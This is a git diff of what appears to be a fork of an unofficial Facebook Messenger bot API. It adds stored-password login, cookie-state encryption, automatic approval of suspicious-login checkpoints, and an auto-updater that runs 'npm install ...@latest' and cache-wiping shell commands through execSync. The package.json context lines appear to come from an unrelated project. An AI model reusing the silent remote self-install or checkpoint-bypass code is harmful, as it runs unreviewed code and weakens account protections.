+                                                                } catch (ex) {
+                                                                    clearInterval(checkVerified);
+                                                                    logger.Warning(Language.VerifiedCheck);
+                                                                    if (callback === prCallback) {
+                                                                        callback = function(/** @type {any} */err, /** @type {any} */api) {
+                                                                            if (err) return prReject(err);
+                                                                            return prResolve(api);
+                                                                        };
+                                                                    }
+                                                                    let appState = utils.getAppState(jar,false);
+                                                                    return loginHelper(appState, email, password, loginOptions, callback);
+                                                                }
+                                                            })
+                                                            .catch((/** @type {any} */ex) => {
+                                                                log.error("login", ex);
+                                                                if (callback === prCallback) prReject(ex);
+                                                                else callback(ex);
+                                                            });
+                                                    }
+                                                    return rtPromise;  
+                                                }
+                                                catch (e) {
+                                                    logger.Error(e)
+                                                    logger.Error()
+                                                    process.exit(0)
+                                                }
+                                            }
+                                            await EnterSecurityCode()
                                         }
-                                        return rtPromise;
+                                        catch (e) {
+                                            logger.Error(e)
+                                            logger.Error();
+                                            process.exit(0);
+                                        }
+                                    } 
+                                        break;
+                                    case false: {
+                                        throw {
+                                            error: 'login-approval',
+                                            continue: function submit2FA(/** @type {any} */code) {
+                                                form.approvals_code = code;
+                                                form['submit[Continue]'] = $("#checkpointSubmitButton").html(); //'Continue';
+                                                var prResolve,prReject;
+                                                var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });
+                                                if (typeof code == "string") {
+                                                    utils
+                                                        .post(nextURL, jar, form, loginOptions)
+                                                        .then(utils.saveCookies(jar))
+                                                        .then(function(/** @type {{ body: string | Buffer; }} */res) {
+                                                            var $ = cheerio.load(res.body);
+                                                            var error = $("#approvals_code").parent().attr("data-xui-error");
+                                                            if (error) {
+                                                                throw {
+                                                                    error: 'login-approval',
+                                                                    errordesc: Language.InvaildTwoAuthCode,
+                                                                    lerror: error,
+                                                                    continue: submit2FA
+                                                                };
+                                                            }
+                                                        })
+                                                        .then(function() {
+                                                            delete form.no_fido;delete form.approvals_code;
+                                                            form.name_action_selected = 'dont_save'; //'save_device' || 'dont_save;
+                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
+                                                        })
+                                                        .then(function(/** @type {{ headers: any; body: string | string[]; }} */res) {
+                                                            var headers = res.headers;
+                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: Language.ApprovalsErr };
+                                                            var appState = utils.getAppState(jar,false);
+                                                            if (callback === prCallback) {
+                                                                callback = function(/** @type {any} */err, /** @type {any} */api) {
+                                                                    if (err) return prReject(err);
+                                                                    return prResolve(api);
+                                                                };
+                                                            }
+                                                            return loginHelper(appState, email, password, loginOptions, callback);
+                                                        })
+                                                        .catch(function(/** @type {any} */err) {
+                                                            if (callback === prCallback) prReject(err);
+                                                            else callback(err);
+                                                        });
+                                                } else {
+                                                    utils
+                                                        .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
+                                                        .then(utils.saveCookies(jar))
+                                                        .then((/** @type {{ body: string; }} */res) => {
+                                                            try { 
+                                                                JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
+                                                            } catch (ex) {
+                                                                clearInterval(checkVerified);
+                                                                logger.Warning(Language.VerifiedCheck);
+                                                                if (callback === prCallback) {
+                                                                    callback = function(/** @type {any} */err, /** @type {any} */api) {
+                                                                        if (err) return prReject(err);
+                                                                        return prResolve(api);
+                                                                    };
+                                                                }
+                                                                return loginHelper(utils.getAppState(jar,false), email, password, loginOptions, callback);
+                                                            }
+                                                        })
+                                                        .catch((/** @type {any} */ex) => {
+                                                            log.error("login", ex);
+                                                            if (callback === prCallback) prReject(ex);
+                                                            else callback(ex);
+                                                        });
+                                                    }
+                                                return rtPromise;
+                                            }
+                                        };
                                     }
-                                };
+                                }
                             } else {
-                                if (!loginOptions.forceLogin) throw { error: "Couldn't login. Facebook might have blocked this account. Please login with a browser or enable the option 'forceLogin' and try again." };
+                                if (!loginOptions.forceLogin) throw { error: Language.ForceLoginNotEnable };
 
                                 if (html.indexOf("Suspicious Login Attempt") > -1) form['submit[This was me]'] = "This was me";
                                 else form['submit[This Is Okay]'] = "This Is Okay";
@@ -393,127 +1309,528 @@ function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
                                     .post(nextURL, jar, form, loginOptions)
                                     .then(utils.saveCookies(jar))
                                     .then(function() {
-                                        // Use the same form (safe I hope)
-                                        form.name_action_selected = 'save_device';
+                                        form.name_action_selected = 'dont_save';
 
                                         return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                     })
-                                    .then(function(res) {
+                                    .then(function(/** @type {{ headers: any; body: string | string[]; }} */res) {
                                         var headers = res.headers;
 
                                         if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with review recent login." };
 
-                                        var appState = utils.getAppState(jar);
+                                        var appState = utils.getAppState(jar,false);
 
-                                        // Simply call loginHelper because all it needs is the jar
-                                        // and will then complete the login process
                                         return loginHelper(appState, email, password, loginOptions, callback);
                                     })
-                                    .catch(e => callback(e));
+                                    .catch((/** @type {any} */e) => callback(e));
                             }
                         });
                 }
-
-                return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
-            });
+            return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
+        });
     };
 }
 
-// Helps the login
-function loginHelper(appState, email, password, globalOptions, callback, prCallback) {
+/!-[ Function backup ]-!/
+
+/**
+ * @param {string} data
+ * @param {any} globalOptions
+ * @param {any} callback
+ * @param {any} prCallback
+ */
+
+function backup(data,globalOptions, callback, prCallback) {
+    try {
+        var appstate;
+        try {
+            appstate = JSON.parse(data)
+        }
+        catch(e) {
+            appstate = data;
+        }
+            logger.Warning(Language.BackupNoti);
+        try {
+            loginHelper(appstate,null,null,globalOptions, callback, prCallback)
+        }
+        catch (e) {
+            logger.Error(Language.ErrBackup);
+            process.exit(0);
+        }
+    }
+    catch (e) {
+        return logger.Error();
+    }
+}
+
+/!-[ async function loginHelper ]-!/
+
+/**
+ * @param {string | any[]} appState
+ * @param {any} email
+ * @param {any} password
+ * @param {{ selfListen?: boolean; listenEvents?: boolean; listenTyping?: boolean; updatePresence?: boolean; forceLogin?: boolean; autoMarkDelivery?: boolean; autoMarkRead?: boolean; autoReconnect?: boolean; logRecordSize?: number; online?: boolean; emitReady?: boolean; userAgent?: string; pageID?: any; }} globalOptions
+ * @param {(arg0: any, arg1: undefined) => void} callback
+ * @param {(error: any, api: any) => any} [prCallback]
+ */
+
+async function loginHelper(appState, email, password, globalOptions, callback, prCallback) {
     var mainPromise = null;
     var jar = utils.getJar();
 
-    // If we're given an appState we loop through it and save each cookie
-    // back into the jar.
+    if (fs.existsSync('./backupappstate.json')) {
+        fs.unlinkSync('./backupappstate.json');
+    }
+
+try {
     if (appState) {
-        appState.map(function(c) {
-            var str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
-            jar.setCookie(str, "http://" + c.domain);
-        });
+        logger.Normal(Language.OnProcess);
+            switch (await Database.has("FBKEY")) {
+                case true: {
+                    process.env.FBKEY = await Database.get("FBKEY");
+                }
+                    break;
+                case false: {
+                    const SecurityKey = global.Fca.Require.Security.create().apiKey;
+                        process.env['FBKEY'] = SecurityKey;
+                    await Database.set('FBKEY', SecurityKey);
+                }
+                    break;
+                default: {
+                    const SecurityKey = global.Fca.Require.Security.create().apiKey;
+                        process.env['FBKEY'] = SecurityKey;
+                    await Database.set('FBKEY', SecurityKey);
+                }
+            }
+            try {
+                switch (global.Fca.Require.Priyansh.EncryptFeature) {
+                    case true: {
+                        appState = JSON.parse(JSON.stringify(appState, null, "\t"));
+                        switch (utils.getType(appState)) {
+                            case "Array": {
+                                switch (utils.getType(appState[0])) {
+                                    case "Object": {
+                                        logger.Normal(Language.NotReadyToDecrypt);
+                                    }
+                                        break;
+                                    case "String": {
+                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');
+                                        logger.Normal(Language.DecryptSuccess);
+                                    }
+                                }
+                            }
+                                break;
+                            case "Object": {
+                                try {
+                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
+                                    logger.Normal(Language.DecryptSuccess);
+                                }
+                                catch (e) {
+                                    if (process.env.Backup != undefined && process.env.Backup) {
+                                    await backup(process.env.Backup,globalOptions, callback, prCallback);
+                                }
+                                else {
+                                    try {
+                                        if (await Database.has('Backup')) {
+                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
+                                        }
+                                        else {
+                                            logger.Normal(Language.ErrBackup);
+                                            process.exit(0);
+                                        }
+                                    }
+                                    catch (e) {
+                                        logger.Warning(Language.ErrBackup);
+                                        logger.Error();
+                                        process.exit(0);
+                                    }
+                                }
+                                    logger.Warning(Language.DecryptFailed);
+                                    return logger.Error();
+                                }
+                            }
+                                break;
+                            case "String": {
+                                try {
+                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
+                                    logger.Normal(Language.DecryptSuccess);
+                                }
+                                catch (e) {
+                                    if (process.env.Backup != undefined && process.env.Backup) {
+                                    await backup(process.env.Backup,globalOptions, callback, prCallback);
+                                }
+                                else {
+                                    try {
+                                        if (await Database.has('Backup')) {
+                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
+                                        }
+                                        else {
+                                            logger.Normal(Language.ErrBackup);
+                                            process.exit(0);
+                                        }
+                                    }
+                                    catch (e) {
+                                        logger.Warning(Language.ErrBackup);
+                                        logger.Error();
+                                        process.exit(0);
+                                    }
+                                }
+                                    logger.Warning(Language.DecryptFailed);
+                                    return logger.Error();
+                                } 
+                            }
+                                break;
+                            default: {
+                                logger.Warning(Language.InvaildAppState);
+                                process.exit(0)
+                            }
+                        } 
+                    }
+                        break;
+                    case false: {
+                        switch (utils.getType(appState)) { 
+                            case "Array": {
+                                logger.Normal(Language.EncryptStateOff);
+                            }
+                                break;
+                            case "Object": {
+                                logger.Normal(Language.EncryptStateOff);
+                                try {
+                                    appState = StateCrypt.decryptState(appState, process.env['FBKEY']);
+                                    logger.Normal(Language.DecryptSuccess);
+                                }
+                                catch (e) {
+                                    if (process.env.Backup != undefined && process.env.Backup) {
+                                        await backup(process.env.Backup,globalOptions, callback, prCallback);
+                                    }
+                                else {
+                                    try {
+                                        if (await Database.has('Backup')) {
+                                            return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
+                                        }
+                                        else {
+                                            logger.Warning(Language.ErrBackup);
+                                            process.exit(0);
+                                        }
+                                    }
+                                    catch (e) {
+                                        logger.Warning(Language.ErrBackup);
+                                        logger.Error();
+                                        process.exit(0);
+                                    }
+                                }
+                                    logger.Warning(Language.DecryptFailed);
+                                    return logger.Error();
+                                }
+                            }
+                                break;
+                            default: {
+                                logger.Warning(Language.InvaildAppState);
+                                process.exit(0)
+                            }
+                        } 
+                    }
+                        break;
+                    default: {
+                        logger.Warning(getText(Language.IsNotABoolean,global.Fca.Require.Priyansh.EncryptFeature))
+                        process.exit(0);
+                    }
+                }
+            }
+            catch (e) {
+                console.log(e);
+            }
 
-        // Load the main page.
-        mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));
-    } else {
-        // Open the main page, then we login with the given credentials and finally
-        // load the main page again (it'll give us some IDs that we need)
-        mainPromise = utils
-            .get("https://www.facebook.com/", null, null, globalOptions, { noRef: true })
+        try {
+            appState = JSON.parse(appState);
+        }
+        catch (e) {
+            try {
+                appState = appState;
+            }
+            catch (e) {
+                return logger.Error();
+            }
+        }
+        try {
+            global.Fca.Data.AppState = appState;
+                appState.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {
+                    var str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
+                    jar.setCookie(str, "http://" + c.domain);
+                });
+                process.env.Backup = appState;
+                await Database.set('Backup', appState);
+            mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));
+        } catch (e) {
+            console.log(e)
+            if (process.env.Backup != undefined && process.env.Backup) {
+                return await backup(process.env.Backup,globalOptions, callback, prCallback);
+            }
+            try {
+                if (await Database.has('Backup')) {
+                    return await backup(await Database.get('Backup'),globalOptions, callback, prCallback);
+                }
+                else {
+                    logger.Warning(Language.ErrBackup);
+                    process.exit(0);
+                }
+            }
+            catch (e) {
+                logger.Warning(Language.ErrBackup);
+                process.exit(0);
+            }
+        return logger.Warning(Language.ErrBackup); // unreachable ðŸ‘‘ 
+    }
+} else {
+    mainPromise = utils
+        .get("https://www.facebook.com/", null, null, globalOptions, { noRef: true })
             .then(utils.saveCookies(jar))
             .then(makeLogin(jar, email, password, globalOptions, callback, prCallback))
             .then(function() {
                 return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(utils.saveCookies(jar));
             });
+        }
+    } catch (e) {
+        console.log(e);
     }
+        var ctx,api;
+            mainPromise = mainPromise
+                .then(function(/** @type {{ body: string; }} */res) {
+                    var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/,redirect = reg.exec(res.body);
+                        if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));
+                    return res;
+                })
+                .then(function(/** @type {{ body: any; }} */res) {
+                    var html = res.body,Obj = buildAPI(globalOptions, html, jar);
+                        ctx = Obj.ctx;
+                        api = Obj.api;
+                        process.env.api = Obj.api;
+                    return res;
+                });
+            if (globalOptions.pageID) {
+                mainPromise = mainPromise
+                    .then(function() {
+                        return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
+                    })
+                    .then(function(/** @type {{ body: any; }} */resData) {
+                        var url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
+                        url = url.substring(0, url.length - 1);
+                        return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
+                    });
+            }
+        mainPromise
+            .then(function() {
+                const { execSync } = require('child_process');
+                    Fetch('https://raw.githubusercontent.com/corazoncary/fca/main/package.json').then(async (/** @type {{ body: { toString: () => string; }; }} */res) => {
+                        const localVersion = global.Fca.Version;
+                            if (Number(localVersion.replace(/\./g,"")) < Number(JSON.parse(res.body.toString()).version.replace(/\./g,"")) ) {
+                                log.warn("[ FCA-PRIYANSH ] â€¢",getText(Language.NewVersionFound,global.Fca.Version,JSON.parse(res.body.toString()).version));
+                                if (global.Fca.Require.Priyansh.AutoUpdate == true) { 
+                                    log.warn("[ FCA-PRIYANSH ] â€¢",Language.AutoUpdate);
+                                        try {
+                                            execSync('npm install fca-priyansh@latest', { stdio: 'inherit' });
+                                                logger.Success(Language.UpdateSuccess)
+                                                    logger.Normal(Language.RestartAfterUpdate);
+                                                    await new Promise(resolve => setTimeout(resolve,5*1000));
+                                                console.clear();process.exit(1);
+                                            }
+                                        catch (err) {
+                                            log.warn('Error Update: ' + err);
+                                                logger.Normal(Language.UpdateFailed);
+                                            try {
+                                                const fs = require('fs-extra')
+                                                    try {
+                                                logger.Error('succeess Package');
+                                                    execSync('npm cache clean --force', { stdio: 'ignore'})
+                                                        await new Promise(resolve => setTimeout(resolve, 2*1000))
+                                                            fs.removeSync('../fca-priyansh');
+                                                                // why stdio is not studio :v 
+                                                            await new Promise(resolve => setTimeout(resolve, 2*1000))
+                                                        execSync('npm i fca-priyansh@latest', { stdio: 'inherit'})
+                                                    logger.Success("success Restart");
+                                                process.exit(1);
+                                            }
+                                            catch (e) {
+                                                logger.Warning("Error Please Enter The Following Code In Console To Fix !");
+                                                    logger.Warning("rmdir -rf ./node_modules/fca-priyansh && npm i fca-priyansh@latest && npm start");
+                                                    logger.Warning("Please Copy All The Above Words, Need To Do It 100% Correctly Otherwise Your File Will Be Discolored âœ¨")
+                                                process.exit(0);
+                                            }
+                                            }
+                                            catch (e) {
+                                                logger.Error(Language.NotiAfterUseToolFail)
+                                                    logger.Warning("rmdir ./node_modules after type npm i && npm start");
+                                                process.exit(0);
+                                            }
+                                        }
+                                    }
+                                }
+                    else {
+                        logger.Normal(getText(Language.LocalVersion,localVersion));
+                            logger.Normal(getText(Language.CountTime,global.Fca.Data.CountTime()))   
+                                logger.Normal(Language.WishMessage[Math.floor(Math.random()*Language.WishMessage.length)]);
+                                require('./Extra/ExtraUptimeRobot')();
+                            DataLanguageSetting.HTML.HTML==true? global.Fca.Require.Web.listen(global.Fca.Require.Web.get('DFP')) : global.Fca.Require.Web = null;
+                       callback(null, api);
+                    };
+                }).catch(async function(e) {
+                    console.log(e)
+                    logger.Warning(Language.AutoCheckUpdateFailure)
+                        logger.Normal(getText(Language.LocalVersion,global.Fca.Version));
+                            logger.Normal(getText(Language.CountTime,global.Fca.Data.CountTime()))   
+                        logger.Normal(Language.WishMessage[Math.floor(Math.random()*Language.WishMessage.length)]);
+                        require('./Extra/ExtraUptimeRobot')();
+                    DataLanguageSetting.HTML.HTML==true? global.Fca.Require.Web.listen(global.Fca.Require.Web.get('DFP')) : global.Fca.Require.Web = null;
+                callback(null, api);
+                });
+            }).catch(function(/** @type {{ error: any; }} */e) {
+            log.error("login", e.error || e);
+        callback(e);
+    });
+}
 
-    var ctx = null;
-    var _defaultFuncs = null;
-    var api = null;
-
-    mainPromise = mainPromise
-        .then(function(res) {
-            // Hacky check for the redirection that happens on some ISPs, which doesn't return statusCode 3xx
-            var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/;
-            var redirect = reg.exec(res.body);
-            if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));
-            return res;
-        })
-        .then(function(res) {
-            var html = res.body;
-            var stuff = buildAPI(globalOptions, html, jar);
-            ctx = stuff[0];
-            _defaultFuncs = stuff[1];
-            api = stuff[2];
-            return res;
-        });
+/**
+ * It asks the user for their account and password, and then saves it to the database.
+ */
 
-    // given a pageID we log in as a page
-    if (globalOptions.pageID) {
-        mainPromise = mainPromise
-            .then(function() {
-                return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
-            })
-            .then(function(resData) {
-                var url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
-                url = url.substring(0, url.length - 1);
-                return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
-            });
+/*async function setUserNameAndPassWord() {
+    let rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    let localbrand2 = global.Fca.Version
+    console.clear();
+    console.log(figlet.textSync('Horizon', {font: 'ANSI Shadow',horizontalLayout: 'default',verticalLayout: 'default',width: 0,whitespaceBreak: true }));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Operating System: " + chalk.bold.red(os.type()));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Machine Version: " + chalk.bold.red(os.version()));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Fca Version: " + chalk.bold.red(localbrand2) + '\n');
+    try {
+        const configPath = process.argv[2] || "./acc.json";
+        const config = require(configPath);
+        const Account = config.EMAIL;
+        const Password = config.PASSWORD;
+
+        try {
+            await Database.set("Account", Account);
+            await Database.set("Password", Password);
+        }
+        catch (e) {
+            logger.Warning(Language.ErrDataBase);
+            logger.Error();
+            process.exit(0);
+        }
+        if (global.Fca.Require.Priyansh.ResetDataLogin) {
+            global.Fca.Require.Priyansh.ResetDataLogin = false;
+            global.Fca.Require.fs.writeFileSync(process.cwd() + '/PriyanshFca.json', JSON.stringify(global.Fca.Require.Priyansh, null, 4));
+        }
+        logger.Success(Language.SuccessSetData);
+        process.exit(1);
+    }
+    catch (e) {
+        logger.Error(e)
     }
+}
 
-    // At the end we call the callback or catch an exception
-    mainPromise
-        .then(function() {
-            log.info("login", 'HoÃ n ThÃ nh QuÃ¡ TrÃ¬nh ÄÄƒng Nháº­p !');
-            return callback(null, api);
-        })
-        .catch(function(e) {
-            log.error("login", e.error || e);
-            callback(e);
+module.exports = setUserNameAndPassWord;
+*/
+
+const config = require('./../../config.json');
+
+function setUserNameAndPassWord() {
+    let rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    let localbrand2 = global.Fca.Version;
+    console.clear();
+    console.log(figlet.textSync('Horizon', {font: 'ANSI Shadow', horizontalLayout: 'default', verticalLayout: 'default', width: 0, whitespaceBreak: true }));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Operating System: " + chalk.bold.red(os.type()));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Machine Version: " + chalk.bold.red(os.version()));
+    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Fca Version: " + chalk.bold.red(localbrand2) + '\n');
+
+    try {
+        const Account = config.EMAIL; // Fetch account from config
+        const Password = config.PASSWORD; // Fetch password from config
+        // Wrap the following code in a Promise to use async/await
+        new Promise(async (resolve, reject) => {
+            try {
+                // Save account and password to database
+                await Database.set("Account", Account);
+                await Database.set("Password", Password);
+                resolve();
+            } catch (e) {
+                reject(e);
+            }
+        }).then(() => {
+            if (global.Fca.Require.Priyansh.ResetDataLogin) {
+                global.Fca.Require.Priyansh.ResetDataLogin = false;
+                global.Fca.Require.fs.writeFileSync(process.cwd() + '/PriyanshFca.json', JSON.stringify(global.Fca.Require.Priyansh, null, 4));
+            }
+            logger.Success(Language.SuccessSetData);
+            process.exit(1);
+        }).catch((error) => {
+            logger.Warning(Language.ErrDataBase);
+            logger.Error();
+            process.exit(0);
         });
+    } catch (e) {
+        logger.Error(e);
+    }
 }
 
+/**
+ * @param {{ email: any; password: any; appState: any; }} loginData
+ * @param {{}} options
+ * @param {(error: any, api: any) => any} callback
+ */
+
 function login(loginData, options, callback) {
+
+    if (utils.getType(loginData) == "Array") {
+        if (loginData.length == 3) {
+            options = loginData[1];
+            callback = loginData[2];
+            loginData = loginData[0]
+        }
+        else if (loginData.length == 2) {
+            options = loginData[1];
+            loginData = loginData[0]
+        }
+        else {
+            loginData = loginData[0]
+        }
+    }
+
     if (utils.getType(options) === 'Function' || utils.getType(options) === 'AsyncFunction') {
         callback = options;
         options = {};
     }
 
     var globalOptions = {
-        selfListen: false,
+        selfListen: true,
         listenEvents: true,
-        listenTyping: false,
+        listenTyping: true,
         updatePresence: false,
         forceLogin: false,
-        autoMarkDelivery: false,
-        autoMarkRead: false,
+        autoMarkDelivery: true,
+        autoMarkRead: true,
         autoReconnect: true,
-        logRecordSize: defaultLogRecordSize,
-        online: false,
+        logRecordSize: 100,
+        online: true,
         emitReady: false,
-        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"
+        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
     };
 
-    setOptions(globalOptions, options);
+    if (loginData.email && loginData.password) {
+        setOptions(globalOptions, {
+            logLevel: "silent",
+            forceLogin: true,
+            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"
+        });
+    }
+    else if (loginData.appState) {
+        setOptions(globalOptions, options);
+    }
 
     var prCallback = null;
     if (utils.getType(callback) !== "Function" && utils.getType(callback) !== "AsyncFunction") {
@@ -522,15 +1839,60 @@ function login(loginData, options, callback) {
         var returnPromise = new Promise(function(resolve, reject) {
             resolveFunc = resolve;
             rejectFunc = reject;
-        });
-        prCallback = function(error, api) {
+        }); 
+        prCallback = function(/** @type {any} */error, /** @type {any} */api) {
             if (error) return rejectFunc(error);
             return resolveFunc(api);
         };
         callback = prCallback;
     }
-    loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
+
+    (async function() {
+        var Premium = require("./Extra/Src/Premium");
+        global.Fca.Data.PremText = await Premium(global.Fca.Require.Security.create().uuid) || "Báº¡n Äang SÃ i PhiÃªn Báº£n: Free !";
+        if (!loginData.email && !loginData.password) {
+            switch (global.Fca.Require.Priyansh.AutoLogin) {
+                case true: {
+                    if (global.Fca.Require.Priyansh.ResetDataLogin) return setUserNameAndPassWord();
+                    else {
+                        try {
+                            if (await Database.get("TempState")) { 
+                                try {
+                                    loginData.appState = JSON.parse(await Database.get("TempState"));
+                                }
+                                catch (_) {
+                                    loginData.appState = await Database.get("TempState");
+                                }
+                                await Database.delete("TempState");
+                            }
+                        }
+                        catch (e) {
+                            console.log(e)
+                            await Database.delete("TempState");
+                                logger.Warning(Language.ErrDataBase);
+                                logger.Error();
+                            process.exit(0);
+                        }
+                        try {
+                            if (await Database.has('Account') && await Database.has('Password')) return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
+                            else return setUserNameAndPassWord();
+                        }
+                        catch (e) {
+                            console.log(e)
+                            logger.Warning(Language.ErrDataBase);
+                                logger.Error();
+                            process.exit(0);
+                        }
+                    }
+                }
+                case false: {
+                    loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
+                }
+            }
+        }
+        else loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
+    })()
     return returnPromise;
 }
 
-module.exports = login;
\ No newline at end of file
+module.exports = login;
diff --git a/logger.js b/logger.js
new file mode 100644
index 000000000..e11475837
--- /dev/null
+++ b/logger.js
@@ -0,0 +1,66 @@
+'use strict';
+/* eslint-disable linebreak-style */
+
+const chalk = require('chalk');
+var isHexcolor = require('is-hexcolor');
+var getText = function(/** @type {string[]} */ ...Data) {
+	var Main = (Data.splice(0,1)).toString();
+		for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);
+	return Main;
+};
+/**
+ * @param {any} obj
+ */
+function getType(obj) {
+    return Object.prototype.toString.call(obj).slice(8, -1);
+}
+
+module.exports = {
+	Normal: function(/** @type {string} */ Str, /** @type {() => any} */ Data ,/** @type {() => void} */ Callback) {
+		if (isHexcolor(global.Fca.Require.Priyansh.MainColor) != true) {
+			this.Warning(getText(global.Fca.Require.Language.Index.InvaildMainColor,global.Fca.Require.Priyansh.MainColor),process.exit(0));
+		}
+		else console.log(chalk.hex(global.Fca.Require.Priyansh.MainColor).bold(`${global.Fca.Require.Priyansh.MainName || '[ PRIYANSH ]'} > `) + Str);
+		if (getType(Data) == 'Function' || getType(Data) == 'AsyncFunction') {
+			return Data();
+		}
+		if (Data) {
+			return Data;
+		}
+		if (getType(Callback) == 'Function' || getType(Callback) == 'AsyncFunction') {
+			Callback();
+		}
+		else return Callback;
+	},
+	Warning: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {
+		console.log(chalk.magenta.bold('[ FCA-WARNING ] > ') + chalk.yellow(str));
+		if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {
+			callback();
+		}
+		else return callback;
+	},
+	Error: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {
+		if (!str) {
+			console.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + chalk.red("Already Faulty, Please Contact: Facebook.com/Priyansh.Rajput.Official"));
+		}
+		console.log(chalk.magenta.bold('[ FCA-ERROR ] > ') + chalk.red(str));
+		if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {
+			callback();
+		}
+		else return callback;
+	},
+	Success: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {
+		console.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.Priyansh.MainName || '[ PRIYANSH ]'} > `) + chalk.green(str));
+		if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {
+			callback();
+		}
+		else return callback;
+	},
+	Info: function(/** @type {unknown} */ str, /** @type {() => void} */ callback) {
+		console.log(chalk.hex('#9900FF').bold(`${global.Fca.Require.Priyansh.MainName || '[ PRIYANSH ]'} > `) + chalk.blue(str));
+		if (getType(callback) == 'Function' || getType(callback) == 'AsyncFunction') {
+			callback();
+		}
+		else return callback;
+	}
+};
diff --git a/package.json b/package.json
index 4c1905947..bd4e70bb9 100644
--- a/package.json
+++ b/package.json
@@ -27,13 +27,34 @@
     "mquery": "5.0.0",
     "ms": "2.1.3",
     "sift": "17.1.3",
-    "bluebird": "^2.11.0",
-    "cheerio": "^1.0.0-rc.10",
-    "https-proxy-agent": "^4.0.0",
-    "mqtt": "^4.2.8",
-    "npmlog": "^1.2.0",
-    "request": "^2.53.0",
-    "websocket-stream": "^5.5.0"
+    "bluebird": "latest",
+    "cheerio": "latest",
+    "https-proxy-agent": "latest",
+    "mqtt": "latest",
+    "npmlog": "latest",
+    "request": "latest",
+    "websocket-stream": "latest",
+    "aes-js": "latest",
+    "assert": "latest",
+    "better-sqlite3": "7.4.5",
+    "chalk": "4.1.2",
+    "crypto-js": "latest",
+    "express": "latest",
+    "file-url": "^3.0.0",
+    "got": "^11.8.3",
+    "is-hexcolor": "^1.0.0",
+    "lodash": "latest",
+    "moment": "^2.29.4",
+    "os": "latest",
+    "path": "latest",
+    "pretty-ms": "7.0.1",
+    "readline": "latest",
+    "semver": "^7.4.0",
+    "sqlite": "4.0.21",
+    "totp-generator": "latest",
+    "uuid": "latest",
+    "encode32": "latest",
+    "tough-cookie": "^4.1.2"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -99,7 +120,7 @@
